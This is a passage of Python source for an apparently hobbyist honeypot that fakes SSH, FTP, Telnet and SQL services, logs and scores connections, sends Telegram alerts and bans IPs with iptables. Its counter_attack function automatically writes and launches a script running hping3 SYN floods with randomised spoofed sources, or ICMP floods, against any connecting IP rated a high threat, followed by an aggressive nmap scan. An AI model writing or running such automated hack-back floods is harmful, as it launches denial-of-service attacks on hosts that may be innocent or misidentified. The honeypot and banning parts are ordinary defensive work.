        print_colored(f"🚨 THREAT LEVEL {threat_level}/10 - LAUNCHING COUNTER-ATTACK FIRST", Colors.RED, bold=True)
        counter_attack(ip)
    
    # Auto-ban IP for any attack (regardless of threat level) - AFTER counter-attack
    ban_ip(ip)
    
    # Trigger alert
    alert(ip, port, attack_patterns, threat_level, ip_info)

# Enhanced alert function
def alert(ip, port, attack_patterns, threat_level, ip_info):
    threat_emoji = "🔴" if threat_level >= 7 else "🟡" if threat_level >= 4 else "🟢"
    
    warning_message = f"""
{threat_emoji} ALERT! Attack detected from {ip} on port {port} {threat_emoji}
📍 Location: {ip_info['city']}, {ip_info['country']}
🏢 ISP: {ip_info['isp']}
🎯 Attack Patterns: {', '.join(attack_patterns) if attack_patterns else 'Connection attempt'}
⚠️  Threat Level: {threat_level}/10
"""
    
    # High threat attacks get glitch effects
    if threat_level >= 7:
        print_colored("🚨 CRITICAL THREAT DETECTED 🚨", Colors.RED, bold=True)
        glitch_effect("INTRUSION_ALERT", 1.0)
        print_colored(warning_message, Colors.RED, bold=True)
        # Matrix-style alert for critical threats
        matrix_rain_effect(1.0)
        # Multiple alert sounds for critical threats
        for _ in range(3):
            play_alert_sound(threat_level)
            time.sleep(0.2)
    elif threat_level >= 4:
        print_colored(warning_message, Colors.YELLOW, bold=True)  # Yellow for medium threat
        # Double alert sound for medium threats
        play_alert_sound(threat_level)
        time.sleep(0.1)
        play_alert_sound(threat_level)
    else:
        print_colored(warning_message, Colors.GREEN, bold=True)  # Green for low threat
        # Single alert sound for low threats
        play_alert_sound(threat_level)

    # Send Telegram alert if enabled
    if ENABLE_TELEGRAM_ALERTS:
        send_telegram_alert(ip, port, attack_patterns, threat_level, ip_info)

def play_alert_sound(threat_level=1):
    """ANNOYING alert sound that works on both Windows and Linux"""
    try:
        if os.name == 'nt':
            # Windows - use winsound with ANNOYING frequencies
            import winsound
            
            # ANNOYING frequencies: 800Hz and 1000Hz (more irritating)
            if threat_level < 5:
                # Low threat - ANNOYING single beep
                winsound.Beep(800, 500)
            elif threat_level < 8:
                # Medium threat - ANNOYING double beep
                winsound.Beep(800, 400)
                time.sleep(0.05)
                winsound.Beep(1000, 400)
                time.sleep(0.05)
                winsound.Beep(800, 400)
            else:
                # High threat - VERY ANNOYING rapid sequence
                for i in range(6):
                    winsound.Beep(800, 150)
                    time.sleep(0.05)
                time.sleep(0.2)
                for i in range(6):
                    winsound.Beep(1000, 150)
                    time.sleep(0.05)
                time.sleep(0.2)
                for i in range(6):
                    winsound.Beep(800, 150)
                    time.sleep(0.05)
                    
        else:
            # Linux/WSL - use multiple methods optimized for WSL
            sound_played = False
            
            # Method 1: beep command (works best in WSL) - ANNOYING
            if not sound_played:
                try:
                    if threat_level < 5:
                        # ANNOYING single beep
                        os.system('beep -f 800 -l 500 2>/dev/null')
                    elif threat_level < 8:
                        # ANNOYING triple beep
                        os.system('beep -f 800 -l 400 2>/dev/null')
                        time.sleep(0.05)
                        os.system('beep -f 1000 -l 400 2>/dev/null')
                        time.sleep(0.05)
                        os.system('beep -f 800 -l 400 2>/dev/null')
                    else:
                        # VERY ANNOYING rapid sequence
                        for i in range(6):
                            os.system('beep -f 800 -l 150 2>/dev/null')
                            time.sleep(0.05)
                        time.sleep(0.2)
                        for i in range(6):
                            os.system('beep -f 1000 -l 150 2>/dev/null')
                            time.sleep(0.05)
                        time.sleep(0.2)
                        for i in range(6):
                            os.system('beep -f 800 -l 150 2>/dev/null')
                            time.sleep(0.05)
                    sound_played = True
                except:
                    pass
            
            # Method 2: Bell character (always works in WSL) - ANNOYING
            if not sound_played:
                if threat_level < 5:
                    # ANNOYING single bell
                    print('\a', end='', flush=True)
                elif threat_level < 8:
                    # ANNOYING triple bell
                    print('\a', end='', flush=True)
                    time.sleep(0.05)
                    print('\a', end='', flush=True)
                    time.sleep(0.05)
                    print('\a', end='', flush=True)
                else:
                    # VERY ANNOYING rapid bell sequence
                    for i in range(6):
                        print('\a', end='', flush=True)
                        time.sleep(0.05)
                    time.sleep(0.2)
                    for i in range(6):
                        print('\a', end='', flush=True)
                        time.sleep(0.05)
                    time.sleep(0.2)
                    for i in range(6):
                        print('\a', end='', flush=True)
                        time.sleep(0.05)
                sound_played = True
            
            # Method 3: paplay (PulseAudio) - fallback
            if not sound_played:
                try:
                    os.system('paplay /usr/share/sounds/freedesktop/stereo/complete.oga 2>/dev/null')
                    sound_played = True
                except:
                    pass
            
            # Method 4: speaker-test (ALSA) - last resort (usually fails in WSL)
            if not sound_played:
                try:
                    if threat_level < 5:
                        os.system(f'speaker-test -t sine -f 800 -l 1 -D default 2>/dev/null')
                    elif threat_level < 8:
                        os.system(f'speaker-test -t sine -f 800 -l 1 -D default 2>/dev/null')
                        time.sleep(0.05)
                        os.system(f'speaker-test -t sine -f 1000 -l 1 -D default 2>/dev/null')
                        time.sleep(0.05)
                        os.system(f'speaker-test -t sine -f 800 -l 1 -D default 2>/dev/null')
                    else:
                        for i in range(6):
                            os.system(f'speaker-test -t sine -f 800 -l 1 -D default 2>/dev/null')
                            time.sleep(0.05)
                        time.sleep(0.2)
                        for i in range(6):
                            os.system(f'speaker-test -t sine -f 1000 -l 1 -D default 2>/dev/null')
                            time.sleep(0.05)
                        time.sleep(0.2)
                        for i in range(6):
                            os.system(f'speaker-test -t sine -f 800 -l 1 -D default 2>/dev/null')
                            time.sleep(0.05)
                    sound_played = True
                except:
                    pass
                        
    except Exception as e:
        # Silently ignore sound errors
        pass

# Enhanced Telegram alert
def send_telegram_alert(ip, port, attack_patterns, threat_level, ip_info):
    threat_emoji = "🔴" if threat_level >= 7 else "🟡" if threat_level >= 4 else "🟢"
    
    message = f"""
{threat_emoji} HONEYPOT ALERT {threat_emoji}

🌐 IP: {ip}
🔌 Port: {port}
📍 Location: {ip_info['city']}, {ip_info['country']}
🏢 ISP: {ip_info['isp']}
🎯 Patterns: {', '.join(attack_patterns) if attack_patterns else 'Connection attempt'}
⚠️ Threat Level: {threat_level}/10
⏰ Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    try:
        requests.post(url, data=data)
    except Exception as e:
        logging.error(f"Failed to send Telegram alert: {e}")

# Enhanced connection handler with interactive responses
def handle_connection(client_socket, port):
    client_ip = client_socket.getpeername()[0]
    session_id = hashlib.md5(f"{client_ip}_{time.time()}_{random.randint(1, 9999)}".encode()).hexdigest()[:12]
    
    try:
        service_config = FAKE_BANNERS.get(port, {})
        banner = service_config.get("banner", f"Service on port {port}")
        
        # Send initial banner
        client_socket.send(banner.encode() if isinstance(banner, str) else banner)
        
        if service_config.get("interactive", False):
            # Handle interactive sessions
            handle_interactive_session(client_socket, port, client_ip, session_id)
        else:
            # Handle simple HTTP-like responses
            if port in [80, 443, 8080]:
                html_content = service_config.get("html_content", "<h1>Service Active</h1>")
                response = f"HTTP/1.1 200 OK\r\nServer: Apache/2.4.41\r\nContent-Type: text/html\r\nContent-Length: {len(html_content)}\r\n\r\n{html_content}"
                client_socket.send(response.encode())
            
            # Log the connection
            log_attack(client_ip, port, "", session_id)
            
    except Exception as e:
        # Don't log normal connection closures
        if "10054" not in str(e) and "forcibly closed" not in str(e):
            logging.error(f"Error handling connection from {client_ip} on port {port}: {e}")
    finally:
        try:
            client_socket.close()
        except:
            pass

# Handle interactive sessions (SSH, FTP, etc.)
def handle_interactive_session(client_socket, port, client_ip, session_id):
    buffer = ""
    command_count = 0
    
    while command_count < 10:  # Limit to prevent infinite loops
        try:
            data = client_socket.recv(1024).decode('utf-8', errors='ignore')
            if not data:
                break
                
            buffer += data
            
            # Process commands based on port
            if port == 22:  # SSH
                response = handle_ssh_commands(buffer, command_count)
            elif port == 21:  # FTP
                response = handle_ftp_commands(buffer, command_count)
            elif port == 23:  # Telnet
                response = handle_telnet_commands(buffer, command_count)
            elif port == 1433 or port == 3306:  # SQL
                response = handle_sql_commands(buffer, command_count)
            else:
                response = f"Command received: {buffer.strip()}\r\n"
            
            client_socket.send(response.encode())
            
            # Log the interaction
            log_attack(client_ip, port, buffer.strip(), session_id)
            
            buffer = ""
            command_count += 1
            
            # Add some delay to make it more realistic
            time.sleep(random.uniform(0.1, 0.5))
            
        except Exception as e:
            # Don't log normal connection closures
            if "10054" not in str(e) and "forcibly closed" not in str(e):
                logging.error(f"Error in interactive session: {e}")
            break

# Handle SSH-like commands
def handle_ssh_commands(command, count):
    command = command.strip().lower()
    
    if "ls" in command:
        return "drwxr-xr-x 2 root root 4096 Jan 1 12:00 .\ndrwxr-xr-x 2 root root 4096 Jan 1 12:00 ..\n-rw-r--r-- 1 root root 1234 Jan 1 12:00 config.txt\n"
    elif "pwd" in command:
        return "/home/admin\n"
    elif "whoami" in command:
        return "admin\n"
    elif "cat" in command and "/etc/passwd" in command:
        return "root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:admin:/home/admin:/bin/bash\n"
    elif "uname" in command:
        return "Linux server 5.4.0-74-generic #83-Ubuntu SMP Sat May 8 02:35:39 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\n"
    else:
        return f"bash: {command}: command not found\n"

# Handle FTP commands
def handle_ftp_commands(command, count):
    command = command.strip().upper()
    
    if "USER" in command:
        return "331 Please specify the password.\r\n"
    elif "PASS" in command:
        return "230 Login successful.\r\n"
    elif "LIST" in command or "NLST" in command:
        return "150 Here comes the directory listing.\r\n-rw-r--r-- 1 ftp ftp 1234 Jan 1 12:00 file.txt\r\n226 Directory send OK.\r\n"
    elif "CWD" in command:
        return "250 Directory successfully changed.\r\n"
    elif "PWD" in command:
        return "257 \"/\" is the current directory.\r\n"
    elif "QUIT" in command:
        return "221 Goodbye.\r\n"
    else:
        return "500 Unknown command.\r\n"

# Handle Telnet commands
def handle_telnet_commands(command, count):
    command = command.strip().lower()
    
    if "ls" in command:
        return "total 8\ndrwxr-xr-x 2 user user 4096 Jan 1 12:00 .\ndrwxr-xr-x 2 user user 4096 Jan 1 12:00 ..\n-rw-r--r-- 1 user user 1234 Jan 1 12:00 file.txt\n"
    elif "pwd" in command:
        return "/home/user\n"
    elif "whoami" in command:
        return "user\n"
    elif "exit" in command:
        return "logout\n"
    else:
        return f"bash: {command}: command not found\n"

# Handle SQL commands
def handle_sql_commands(command, count):
    command = command.strip().upper()
    
    if "SELECT" in command:
        return "1 row in set (0.00 sec)\n"
    elif "INSERT" in command:
        return "Query OK, 1 row affected (0.00 sec)\n"
    elif "UPDATE" in command:
        return "Query OK, 1 row affected (0.00 sec)\n"
    elif "DELETE" in command:
        return "Query OK, 1 row affected (0.00 sec)\n"
    elif "CREATE" in command:
        return "Query OK, 0 rows affected (0.00 sec)\n"
    elif "DROP" in command:
        return "Query OK, 0 rows affected (0.00 sec)\n"
    else:
        return "ERROR 1064 (42000): You have an error in your SQL syntax\n"

# Enhanced ban function with reputation tracking
def ban_ip(ip):
    global HIDDEN_DB_FILE
    if is_protected_ip(ip):
        msg = f"[SKIP BAN] Protected IP, not banning: {ip}"
        print_colored(msg, Colors.BLUE, bold=True)
        logging.info(msg)
        return
    if ENABLE_IPTABLES_BAN:
        try:
            # Check if IP is already banned in the database
            conn = sqlite3.connect(HIDDEN_DB_FILE, timeout=20.0)
            cursor = conn.cursor()
            cursor.execute("SELECT is_banned FROM ip_reputation WHERE ip = ?", (ip,))
            result = cursor.fetchone()

            already_banned = result and result[0]
            iptables_banned = False

            # Check if IP is already banned in iptables (INPUT)
            if os.name == 'posix':
                check_cmd_in = f"sudo iptables -C INPUT -s {ip} -j DROP 2>/dev/null"
                check_cmd_out = f"sudo iptables -C OUTPUT -d {ip} -j DROP 2>/dev/null"
                iptables_banned_in = (os.system(check_cmd_in) == 0)
                iptables_banned_out = (os.system(check_cmd_out) == 0)
                iptables_banned = iptables_banned_in and iptables_banned_out

            if not already_banned and not iptables_banned:
                # Ban IP in INPUT, OUTPUT, and FORWARD directions (once per chain)
                if os.name == 'posix':
                    # INPUT
                    check_cmd_in = f"sudo iptables -C INPUT -s {ip} -j DROP 2>/dev/null"
                    if os.system(check_cmd_in) != 0:
                        os.system(f"sudo iptables -A INPUT -s {ip} -j DROP")
                    # OUTPUT
                    check_cmd_out = f"sudo iptables -C OUTPUT -d {ip} -j DROP 2>/dev/null"
                    if os.system(check_cmd_out) != 0:
                        os.system(f"sudo iptables -A OUTPUT -d {ip} -j DROP")
                    # FORWARD
                    check_cmd_fwd = f"sudo iptables -C FORWARD -s {ip} -j DROP 2>/dev/null"
                    if os.system(check_cmd_fwd) != 0:
                        os.system(f"sudo iptables -A FORWARD -s {ip} -j DROP")
                    print_colored(f"\U0001F7E1 DOUBLE BAN: IP {ip} has been DOUBLE BANNED (INPUT, OUTPUT, FORWARD) after counter-attack!", Colors.YELLOW, bold=True)
                cursor.execute("UPDATE ip_reputation SET is_banned = 1 WHERE ip = ?", (ip,))
                conn.commit()
                logging.info(f"DOUBLE BAN: IP {ip} has been DOUBLE BANNED (INPUT, OUTPUT, FORWARD) after counter-attack.")
            elif iptables_banned:
                print_colored(f"ℹ️ IP {ip} is already banned in iptables (INPUT & OUTPUT)", Colors.BLUE)
            conn.close()
        except Exception as e:
            # Don't log database locked errors as they're normal in high traffic
            if "database is locked" not in str(e):
                logging.error(f"Error banning IP {ip}: {e}")

def restore_banned_ips():
    """Restore banned IPs from .honeypot.js files to iptables"""
    try:
        # Find the correct js directory based on where hidden files were created
        js_dir = os.path.join(os.path.dirname(HIDDEN_DB_FILE), ".honeypot.js")
        if not os.path.exists(js_dir):
            print_colored(f"ℹ️ No .honeypot.js directory found at {js_dir}", Colors.BLUE)
            return
        
        print_colored(f"🔍 Searching for banned IPs in {js_dir}", Colors.CYAN)
        banned_count = 0
        for filename in os.listdir(js_dir):
            if filename.endswith('.js'):
                js_file = os.path.join(js_dir, filename)
                try:
                    with open(js_file, 'r', encoding='utf-8') as f:
                        attacker_data = json.load(f)
                    
                    ip = attacker_data.get('ip')
                    is_banned = attacker_data.get('is_banned', False)
                    
                    print_colored(f"📄 Found file: {filename}, IP: {ip}, Banned: {is_banned}", Colors.PURPLE)
                    
                    if ip and is_banned:
                        # Add to iptables if not already banned (INPUT, OUTPUT, FORWARD)
                        if os.name == 'posix':
                            # INPUT
                            result_in = os.system(f"sudo iptables -C INPUT -s {ip} -j DROP 2>/dev/null")
                            if result_in != 0:
                                os.system(f"sudo iptables -A INPUT -s {ip} -j DROP")
                            # OUTPUT
                            result_out = os.system(f"sudo iptables -C OUTPUT -d {ip} -j DROP 2>/dev/null")
                            if result_out != 0:
                                os.system(f"sudo iptables -A OUTPUT -d {ip} -j DROP")
                            # FORWARD
                            result_fwd = os.system(f"sudo iptables -C FORWARD -s {ip} -j DROP 2>/dev/null")
                            if result_fwd != 0:
                                os.system(f"sudo iptables -A FORWARD -s {ip} -j DROP")
                            banned_count += 1
                            print_colored(f"🔒 RESTORED BAN: IP {ip} (INPUT, OUTPUT, FORWARD)", Colors.YELLOW, bold=True)
                        else:
                            # For Windows, just show the ban info
                            banned_count += 1
                            print_colored(f"🔒 FOUND BANNED IP: {ip} (Windows - iptables not available)", Colors.RED, bold=True)
                except Exception as e:
                    logging.error(f"Error reading {js_file}: {e}")
        
        if banned_count > 0:
            print_colored(f"✅ Restored {banned_count} banned IPs to iptables", Colors.GREEN, bold=True)
        else:
            print_colored("ℹ️ No banned IPs to restore", Colors.BLUE)
            
    except Exception as e:
        logging.error(f"Error restoring banned IPs: {e}")

def get_window_position():
    """Get window position for counter-attack windows"""
    global COUNTER_ATTACK_WINDOW_COUNT
    
    # Calculate position based on window count
    # Smart positioning: bottom-right corner with grid arrangement
    screen_width = 1920  # Assume 1920x1080 screen
    screen_height = 1080
    window_width = 800   # xterm width
    window_height = 500  # xterm height
    
    # Arrange windows in a smart grid pattern
    # First window: bottom-right corner
    # Subsequent windows: arranged in a 2x3 grid
    if COUNTER_ATTACK_WINDOW_COUNT == 0:
        # First window: bottom-right
        x = screen_width - window_width - 50
        y = screen_height - window_height - 50
    elif COUNTER_ATTACK_WINDOW_COUNT == 1:
        # Second window: bottom-right, slightly to the left
        x = screen_width - window_width - 100
        y = screen_height - window_height - 50
    elif COUNTER_ATTACK_WINDOW_COUNT == 2:
        # Third window: bottom-right, slightly up
        x = screen_width - window_width - 50
        y = screen_height - window_height - 100
    elif COUNTER_ATTACK_WINDOW_COUNT == 3:
        # Fourth window: bottom-right, more to the left
        x = screen_width - window_width - 150
        y = screen_height - window_height - 50
    elif COUNTER_ATTACK_WINDOW_COUNT == 4:
        # Fifth window: bottom-right, more up
        x = screen_width - window_width - 50
        y = screen_height - window_height - 150
    else:
        # Reset to first position if too many windows
        COUNTER_ATTACK_WINDOW_COUNT = 0
        x = screen_width - window_width - 50
        y = screen_height - window_height - 50
    
    # Ensure window stays on screen
    x = max(0, min(x, screen_width - window_width))
    y = max(0, min(y, screen_height - window_height))
    
    COUNTER_ATTACK_WINDOW_COUNT += 1
    return x, y

def counter_attack(attacking_ip):
    """Launch counter-attack using hping3 in a new terminal"""
    if not ENABLE_COUNTER_ATTACK:
        return
    
    # Check if an attack is already active for this IP
    if is_counter_attack_active(attacking_ip):
        print_colored(f"🚨 COUNTER-ATTACK ALREADY ACTIVE for {attacking_ip}. Skipping new terminal.", Colors.YELLOW)
        return
    
    try:
        add_active_counter_attack(attacking_ip)
        ip_info = get_ip_info(attacking_ip)
        is_internal = ip_info.get("country", "").lower() == "local network"
        if is_internal:
            attack_cmd = f"hping3 -1 --flood {attacking_ip} &"
            attack_desc = "ICMP flood (local network)"
        else:
            attack_cmd = f"hping3 -S --flood --rand-source -p 80 -d 120 {attacking_ip} &"
            attack_desc = "SYN flood with rand-source and -d 120 (external)"

        attack_script = f"""#!/bin/bash
echo "🚨 MAXIMUM POWER COUNTER-ATTACK INITIATED 🚨"
echo "🎯 Target: {attacking_ip}"
echo "⚡ Launching ULTIMATE DoS attack with hping3..."
echo "⏱️  Starting at: $(date)"
echo "🔥 ATTACK TYPE: {attack_desc}"
echo "=================================================="

if ! command -v hping3 &> /dev/null; then
    echo "❌ hping3 not found. Installing..."
    if command -v apt-get &> /dev/null; then
        sudo apt-get update && sudo apt-get install -y hping3
    elif command -v yum &> /dev/null; then
        sudo yum install -y hping3
    else
        echo "❌ Cannot install hping3 automatically"
        exit 1
    fi
fi

# Start the attack in background and get its PID
{attack_cmd}
HPING_PID=$!
echo "🔥 hping3 started with PID $HPING_PID"
echo "⏰ Attack will run for 60 seconds."
for i in $(seq 1 60); do
    echo -ne "\r🚀 ATTACK PROGRESS: $i/60 seconds | 💥 FLOODING: {attacking_ip} "
    sleep 1
done
echo ""
echo "🛑 Stopping hping3 process..."
kill $HPING_PID 2>/dev/null
sleep 1
echo "✅ ATTACK COMPLETED! Total duration: 60 seconds"
echo "🎯 Target: {attacking_ip}"
echo "⏰ Finished at: $(date)"
echo "🔎 Starting post-attack analysis tools in background ..."
(
    echo "[nmap]" && nmap -A {attacking_ip} > nmap.txt 2>&1
) &
(
    echo "[whois]" && whois {attacking_ip} > whois.txt 2>&1
) &
(
    echo "[dig]" && dig +short -x {attacking_ip} > dig.txt 2>&1
) &
(
    echo "[zinfo]" && zinfo {attacking_ip} > zinfo.txt 2>&1
) &
echo "✅ All analysis tools launched in background."
echo "⏰ Auto-closing terminal in 5 seconds..."
sleep 5
exit 0
"""

        script_path = "/tmp/counter_attack.sh"
        with open(script_path, 'w') as f:
            f.write(attack_script)
        os.system(f"chmod +x {script_path}")

        if os.name == 'posix':
            is_wsl = os.path.exists('/proc/version') and 'microsoft' in open('/proc/version').read().lower()
            if is_wsl:
                print_colored(f"🚨 WSL DETECTED - Launching counter-attack", Colors.YELLOW)
                print_colored(f"🎯 Target: {attacking_ip}", Colors.RED, bold=True)
                try:
                    win_script = f"""@echo off
title Counter-Attack: {attacking_ip}
echo [ALERT] COUNTER-ATTACK INITIATED
echo [TARGET] Target: {attacking_ip}
echo [TIME] Starting at: %date% %time%
echo ==================================================
echo [ATTACK] Launching: {attack_desc}
echo [COMMAND] {attack_cmd}
wsl {attack_cmd}
echo [COMPLETE] Attack finished!
echo [CLOSE] Auto-closing in 5 seconds...
timeout /t 5 >nul
exit
"""
                    win_script_path = f"/tmp/counter_attack_{attacking_ip}.bat"
                    with open(win_script_path, 'w') as f:
                        f.write(win_script)
                    os.system(f"cmd.exe /c start cmd /k {win_script_path}")
                    print_colored(f"🚨 COUNTER-ATTACK LAUNCHED in Windows Terminal", Colors.RED, bold=True)
                    print_colored(f"🎯 New Windows command prompt opened", Colors.YELLOW)
                except:
                    print_colored(f"⚡ Starting hping3 attack in background...", Colors.CYAN)
                    os.system(f"bash {script_path} > /tmp/counter_attack_{attacking_ip}.log 2>&1 &")
                    print_colored(f"🔥 Counter-attack launched against {attacking_ip}", Colors.RED, bold=True)
                    print_colored(f"📊 Check logs: tail -f /tmp/counter_attack_{attacking_ip}.log", Colors.YELLOW)
                    print_colored(f"🛑 To stop: pkill -f 'hping3.*{attacking_ip}'", Colors.CYAN)
            else:
                print_colored(f"🚨 LAUNCHING COUNTER-ATTACK against {attacking_ip}", Colors.RED, bold=True)
                x, y = get_window_position()
                print_colored(f"📍 Positioning counter-attack window at ({x}, {y}) - Bottom-Right Area", Colors.CYAN)
                os.system(f"xterm -title 'Counter-Attack: {attacking_ip}' -geometry 80x25+{x}+{y} -e 'bash {script_path}' &")
                print_colored(f"✅ Counter-attack terminal opened successfully", Colors.GREEN)
                return True
        else:
            windows_script = f"""@echo off
title Counter-Attack: {attacking_ip}
echo [ALERT] COUNTER-ATTACK INITIATED
echo [TARGET] Target: {attacking_ip}
echo [TIME] Starting at: %date% %time%
echo [ATTACK] Launching: {attack_desc}
echo [COMMAND] {attack_cmd}
{attack_cmd}
echo [COMPLETE] Attack finished!
echo [CLOSE] Auto-closing in 5 seconds...
timeout /t 5 >nul
exit
"""
            win_script_path = "counter_attack.bat"
            with open(win_script_path, 'w') as f:
                f.write(windows_script)
            x, y = get_window_position()
            print_colored(f"📍 Positioning Windows counter-attack window at ({x}, {y}) - Bottom-Right Area", Colors.CYAN)
            os.system(f"start cmd /k \"title Counter-Attack: {attacking_ip} && {win_script_path}\"")
            print_colored(f"🚨 COUNTER-ATTACK LAUNCHED against {attacking_ip}", Colors.RED, bold=True)
            print_colored(f"🎯 New command prompt opened at position ({x}, {y})", Colors.YELLOW)
    except Exception as e:
        print_colored(f"❌ Error launching counter-attack: {e}", Colors.RED)
        logging.error(f"Counter-attack error: {e}")
    finally:
        remove_active_counter_attack(attacking_ip)

def cleanup_old_counter_attacks():
    """Clean up old counter-attack processes"""
    if os.name == 'posix':
        # Kill old hping3 processes that might be stuck
        os.system("pkill -f 'hping3.*--flood' 2>/dev/null")
        # Close old xterm windows
        os.system("pkill -f 'xterm.*Counter-Attack' 2>/dev/null")
    else:
        # Windows cleanup
        os.system("taskkill /f /im hping3.exe 2>nul")
        os.system("taskkill /f /im cmd.exe 2>nul")
    
    # Reset window counter
    reset_window_counter()

def is_counter_attack_active(ip):
    """Check if a counter-attack is already active for this IP"""
    return ip in ACTIVE_COUNTER_ATTACKS

def add_active_counter_attack(ip):
    """Add IP to active counter-attacks"""
    ACTIVE_COUNTER_ATTACKS.add(ip)

def remove_active_counter_attack(ip):
    """Remove IP from active counter-attacks"""
    if ip in ACTIVE_COUNTER_ATTACKS:
        ACTIVE_COUNTER_ATTACKS.remove(ip)

def reset_window_counter():
    """Reset window counter when needed"""
    global COUNTER_ATTACK_WINDOW_COUNT
    COUNTER_ATTACK_WINDOW_COUNT = 0

def check_hping3_available():
    """Check if hping3 is available on the system"""
    try:
        result = os.system("hping3 --version >/dev/null 2>&1")
        if result == 0:
            return True, "hping3 available for counter-attacks"
        else:
            return False, "hping3 not available (counter-attacks disabled)"
    except:
        return False, "hping3 not available (counter-attacks disabled)"

def test_alert_sound():
    """Test ANNOYING alert sound functionality"""
    try:
        print_colored("🔊 Testing ANNOYING alert sound system...", Colors.CYAN)
        print_colored("  🚨 Using ANNOYING frequencies: 800Hz and 1000Hz", Colors.CYAN)
        
        # Test with different threat levels
        print_colored("  🟢 Testing LOW threat alert (ANNOYING 800Hz)...", Colors.GREEN)
        play_alert_sound(1)  # Low threat
        time.sleep(0.5)
        
        print_colored("  🟡 Testing MEDIUM threat alert (ANNOYING triple beep)...", Colors.YELLOW)
        play_alert_sound(5)  # Medium threat
        time.sleep(0.5)
        
        print_colored("  🔴 Testing HIGH threat alert (VERY ANNOYING rapid sequence)...", Colors.RED)
        play_alert_sound(8)  # High threat
        time.sleep(0.5)
        
        return True, "ANNOYING alert sound system working (800Hz/1000Hz frequencies)"
    except Exception as e:
        return False, f"Alert sound system error: {e}"

# Enhanced honeypot starter
def start_honeypot(ports=None):
    if ports is None:
        ports = DEFAULT_PORTS

    print_colored(f"🔥 Enhanced Honeypot is running on {FAKE_OS}", Colors.CYAN, bold=True)
    print_colored(f"📡 Monitoring ports: {ports}", Colors.BLUE)
    print_colored("=" * 50, Colors.YELLOW)

    # Start all listeners
    for port in ports:
        threading.Thread(target=start_listener, args=(port,), daemon=True).start()
    
    # Wait a moment for ports to start, then show final status
    time.sleep(0.5)
    print_colored("✅ All available ports are now listening", Colors.GREEN)

# Enhanced listener
def start_listener(port):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("0.0.0.0", port))
        server.listen(5)
        print_colored(f"✅ Listening on port {port}", Colors.GREEN)

        while True:
            try:
                client_socket, addr = server.accept()
                client_ip = addr[0]
                now = time.time()
                with _flood_lock:
                    dq = _ip_conn_times[client_ip]
                    dq.append(now)
                    # Remove old timestamps
                    while dq and now - dq[0] > FLOOD_WINDOW_SECONDS:
                        dq.popleft()
                    if len(dq) > FLOOD_MAX_CONNECTIONS:
                        # Flood detected
                        print_colored(f"🚨 FLOOD DETECTED from {client_ip} ({len(dq)} connections/sec)", Colors.RED, bold=True)
                        # سجل هجوم فلود (بدون payload نصي)
                        log_attack(client_ip, port, payload="[AUTO] Flood detected: >50 connections/sec", session_id=None)
                        # أغلق الاتصال فوراً
                        client_socket.close()
                        continue
                threading.Thread(target=handle_connection, args=(client_socket, port)).start()
            except Exception as e:
                logging.error(f"Error accepting connection on port {port}: {e}")
    except Exception as e:
        logging.error(f"Error on port {port}: {e}")
    finally:
        try:
            server.close()
        except:
            pass

# Enhanced spinner with statistics
def spinner():
    global RUNNING, HIDDEN_DB_FILE
    spinner_cycle = itertools.cycle(["|", "/", "-", "\\"])
    glitch_spinner = itertools.cycle(["█", "▓", "▒", "░", "▄", "▀"])
    start_time = time.time()
    
    # Wait a bit for all ports to start
    time.sleep(1)
    
    while RUNNING:
        elapsed = int(time.time() - start_time)
        hours, remainder = divmod(elapsed, 3600)
        minutes, seconds = divmod(remainder, 60)
        
        # Get attack statistics
        try:
            conn = sqlite3.connect(HIDDEN_DB_FILE, timeout=5.0)
            cursor = conn.cursor()
            cursor.execute("SELECT COUNT(*) FROM attacks")
            total_attacks = cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(DISTINCT ip) FROM attacks")
            unique_attackers = cursor.fetchone()[0]
            conn.close()
        except:
            total_attacks = 0
            unique_attackers = 0
        
        # Dynamic spinner based on threat level
        if total_attacks > 10:
            color = Colors.RED
            spinner_char = next(glitch_spinner)  # Use glitch characters for high threat
        elif total_attacks > 5:
            color = Colors.YELLOW
            spinner_char = next(spinner_cycle)
        else:
            color = Colors.GREEN
            spinner_char = next(spinner_cycle)
        
        # Add some glitch effects randomly
        if total_attacks > 0 and random.random() < 0.1:  # 10% chance for glitch
            glitch_text = "".join([random.choice(GLITCH_CHARS) for _ in range(3)])
            status = f"🌀 {glitch_text} Honeypot running... {spinner_char} | ⏱️ {hours:02d}:{minutes:02d}:{seconds:02d} | 🎯 {total_attacks} attacks | 👥 {unique_attackers} attackers"
        else:
            status = f"🌀 Honeypot running... {spinner_char} | ⏱️ {hours:02d}:{minutes:02d}:{seconds:02d} | 🎯 {total_attacks} attacks | 👥 {unique_attackers} attackers"
        
        # Clear line and write status
        sys.stdout.write(f"\r{' ' * 100}\r{color}{status}{Colors.END}")
        sys.stdout.flush()
        time.sleep(0.2)
    
    # Final clean shutdown effect
    clean_effect("Honeypot stopped successfully", 1.0)
    sys.stdout.write(f"\r{Colors.GREEN}✅ Honeypot stopped!{Colors.END}\n")

# Setup enhanced logging
import logging.handlers
# Only setup logging after hidden files are created
def setup_logging():
    if HIDDEN_LOG_FILE:
        logging.basicConfig(
            level=logging.INFO,
            format="%(asctime)s - %(levelname)s - %(message)s",
            handlers=[
                logging.FileHandler(HIDDEN_LOG_FILE, encoding='utf-8'),
                logging.StreamHandler(sys.stdout)
            ]
        )
    else:
        # If no hidden log file, only use console output
        logging.basicConfig(
            level=logging.INFO,
            format="%(asctime)s - %(levelname)s - %(message)s",
            handlers=[
                logging.StreamHandler(sys.stdout)
            ]
        )

# --- Flood Detection State ---
FLOOD_WINDOW_SECONDS = 1
FLOOD_MAX_CONNECTIONS = 50
_flood_lock = threading.Lock()
_ip_conn_times = defaultdict(deque)  # ip: deque of timestamps

# Helper to check if IP is protected (localhost, self, gateway, etc)
def is_protected_ip(ip):
    # Localhost and special addresses
    if ip in ("127.0.0.1", "0.0.0.0", "::1", "255.255.255.255"):  # IPv4/IPv6/broadcast
        return True
    # Self IPs (all interfaces)
    try:
        self_ips = set()
        for iface in socket.getaddrinfo(socket.gethostname(), None):
            self_ips.add(iface[4][0])
        # Add all local IPs from interfaces
        import os
        if os.name != 'nt':
